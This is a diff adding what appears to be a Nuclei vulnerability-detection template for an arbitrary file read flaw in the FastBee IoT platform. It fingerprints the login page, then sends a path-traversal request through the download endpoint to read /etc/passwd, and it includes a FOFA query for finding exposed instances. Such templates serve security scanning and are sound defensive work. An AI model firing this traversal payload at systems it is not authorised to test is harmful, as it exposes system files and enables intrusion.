@@ -1,0 +1,54 @@
+id: fastbee-arbitrary-file-read
+
+info:
+  name: FastBee - Local File Inclusion
+  author: s4e-io
+  severity: high
+  description: |
+    Arbitrary file read vulnerability exists in FastBee IoT platform download, which may lead to sensitive information leakage, data theft and other security risks, thus causing serious harm to the system and users.
+  reference:
+    - https://blog.csdn.net/weixin_43167326/article/details/141806542
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: fastbee
+    product: fastbee
+    fofa-query: "fastbee"
+  tags: fastbee,iot,lfi
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body,"<title>FastBee")'
+          - 'status_code == 200'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+
+      - type: word
+        part: content_type
+        words:
+          - 'application/octet-stream'
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100f4338d8f07e4f63efedc6b938c44b2f0597e8749d3bce47481b71a449dcc244e022053e16b86c8856c64c3b38b067072024cf77a7f210b7033c1d44d2d943197523c:922c64590222798bb761d5b6d8e72950
